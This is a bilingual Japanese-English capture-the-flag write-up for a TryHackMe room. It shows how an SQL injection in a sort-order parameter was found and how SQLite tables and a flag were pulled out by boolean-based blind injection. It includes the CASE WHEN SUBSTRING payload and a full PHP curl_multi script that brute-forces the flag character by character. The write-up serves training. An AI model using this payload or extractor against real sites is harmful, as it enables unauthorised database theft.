# Prioritise
![image](https://github.com/yukaFUNAMI/THM_Writeup/assets/6504854/e2e0bd5c-78b8-4c76-aaac-b97acb185934)
<p>
バナーからSQLiの問題だとわかる。普通に80で簡単なサイトがあるのでSQLiを探す。

I saw it's a SQLi problem and found SQLi.
</p>

### sort by title

![image](https://github.com/yukaFUNAMI/THM_Writeup/assets/6504854/1a4dd085-d648-4e53-8c02-8adb4df8d950)

### sort by date

![image](https://github.com/yukaFUNAMI/THM_Writeup/assets/6504854/96f3e59c-a406-4f81-bf1e-cfd4a2689fcc)

### ' %27
![image](https://github.com/yukaFUNAMI/THM_Writeup/assets/6504854/a9f6dd30-0240-4825-b333-a3a966e56263)

### '' %27%27
![image](https://github.com/yukaFUNAMI/THM_Writeup/assets/6504854/912c196b-8866-4104-84f1-cd9fc4342b0a)


### sort by title ASC/DESC

![image](https://github.com/yukaFUNAMI/THM_Writeup/assets/6504854/b61644b0-68eb-4dcd-b8ea-1be30284fdd1)

![image](https://github.com/yukaFUNAMI/THM_Writeup/assets/6504854/d6294960-5c10-4dc8-b62f-3d337d0c605a)

### ORDER BY
![image](https://github.com/yukaFUNAMI/THM_Writeup/assets/6504854/294b8d76-130a-48d4-a608-1f897deb895d)

![image](https://github.com/yukaFUNAMI/THM_Writeup/assets/6504854/45c42801-69d8-4249-b98d-4a50d1a0bffe)

テーブルは４カラム

Table has 4 columns

Sqlmapでとれなかったのでしかたなくブラインドでやる😥

I couldn't get credentials with Sqlmap, so I had to do it with boolean based blind.

### Payload (Boolean based)
True(order by title)
![image](https://github.com/yukaFUNAMI/THM_Writeup/assets/6504854/2a9ff095-aab0-46d4-990c-dcffcd875041)

False(order by date)
![image](https://github.com/yukaFUNAMI/THM_Writeup/assets/6504854/f9c8a979-e121-411e-ad1e-c5a061ecfd06)

本当はレスポンスコードかContentLengthが異なるようにPayloadを組みたかったができなかった（TrueもFalseも同じLengthなので内容を確認する必要がある。これが地獄の始まり）。UNION SELECTもうまくできず。😞

I wanted to make the Payload so that the response code or Content Length was different, but I couldn't do it and UNION SELECT didn't work either.Since both True and False have the same Length, it's necessary to check the contents.

元ネタ
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md

SQL確認用
https://sqliteonline.com/

### DB SQLite 3.XX
![image](https://github.com/yukaFUNAMI/THM_Writeup/assets/6504854/beed55e7-ccea-4f06-8d74-2f8be9eb1978)

### Table Num 2
![image](https://github.com/yukaFUNAMI/THM_Writeup/assets/6504854/620bff31-122a-4aeb-a91d-d2f842cc7883)
![image](https://github.com/yukaFUNAMI/THM_Writeup/assets/6504854/b6cbdf7a-5c4a-4b52-83d1-e3c3834ffd04)

### Table Name Length 4
![image](https://github.com/yukaFUNAMI/THM_Writeup/assets/6504854/967ed28f-52a6-43d5-986a-65ce0e2afacb)
![image](https://github.com/yukaFUNAMI/THM_Writeup/assets/6504854/328a6ab0-74cf-4c18-a943-4bd78475da82)

### Table Name flag
![image](https://github.com/yukaFUNAMI/THM_Writeup/assets/6504854/974cadf4-75c3-4540-abda-ee61662fce14)
![image](https://github.com/yukaFUNAMI/THM_Writeup/assets/6504854/9518b684-f07c-41dd-bf1d-4ce503d1e0ea)

一文字ずつIntruderをまわし、レスポンスから文字を特定。

Use the Intruder by one character and identify the letter from the response.

全部やってみるとわかるが、もう一方のテーブル名はtodosで４カラム。flagは1カラム。

If you do it all, you'll see that the other table name is todos and has 4 columns. flag has 1 column.


### flag
![image](https://github.com/yukaFUNAMI/THM_Writeup/assets/6504854/f6001604-2f12-4476-a94b-e81e4b6989bf)

同じ要領でflag特定。
Get the flag value same way.

🚩 Congratulations! Thank you for your time, Happy hacking. 🌕🍡🌕🍡🌕🍡


## Omake

![image](https://github.com/yukaFUNAMI/THM_Writeup/assets/6504854/eb8ffcbe-8e91-4c11-88a0-8edf14aa863f)

今回はマルチのCURLで高速化をはかった。
またもちゃっとGPTにつくってもらった。感謝

```
<?php
echo "------ START ----- \n";
$flag = "";
$FLAGLEN=38;
$URL='http://10.10.143.81/';
$SEARCHDATE='2023-08-01';
$SEARCHDATELEN=101;
$strings = array(
    "0","1","2","3","4","5","6","7","8","9",
    "a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z",
    "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z",
    "!","#","$","%","&","(",")","~","=","|","^","-","`","{","[","@","]","}","*",":",";","+","<",">","%20",".",
    "?","_" );

for ($i = 0; $i < $FLAGLEN; $i++) {
    // prm作成
    $prm = array();
    for ($j = 0; $j < count($strings); $j++) {
        $prm[$j] = '?order=(CASE+WHEN(SUBSTRING((SELECT+*+FROM+flag),'.($i + 1).',1)=%27'.$strings[$j].'%27)+THEN+title+ELSE+date+END)';
    }

    // CURL
    $mh = curl_multi_init();        // CURLマルチハンドルを初期化
    $handles = array();

    // 各URLに対してCURLハンドルを作成しマルチハンドルに追加
    foreach ($prm as $prm) {
        $ch = curl_init($URL.$prm);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_multi_add_handle($mh, $ch);
        $handles[] = $ch;
    }

    // マルチハンドルで複数のリクエストを同時に実行
    $running = null;
    do {
        curl_multi_exec($mh, $running);
    } while ($running > 0);

    // 各リクエストのレスポンスを処理
    foreach ($handles as $ch) {
        $response = curl_multi_getcontent($ch);
        
        // レスポンスを行ごとに分割
        $responseLines = explode("\n", $response);

        // 行ごとに "2023-08-01" を探す
        foreach ($responseLines as $lineNumber => $line) {
            if (strpos($line, $SEARCHDATE) !== false) {
                $target = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
                //$target = http://10.10.143.81/?order=(CASE+WHEN(SUBSTRING((SELECT+*+FROM+flag),1,1)=%27c%27)+THEN+title+ELSE+date+END)
                //echo 'URL: ' . $target . ' の行数: ' . $lineNumber."\n";
                if ($lineNumber != $SEARCHDATELEN) {
                    // flagの文字列の切り出し
                     if (preg_match('/%27.%27/', $target, $char)) {
                        $str = str_replace('%27', '', $char[0]);
                        echo $str;
                        $flag = $flag.$str;
                    }
                }
            }
        }
        curl_multi_remove_handle($mh, $ch);
        curl_close($ch);
    }

    curl_multi_close($mh);

    }
//echo "FLAG:".$flag."\n";
echo "\n------ END ------- \n";
?>
```


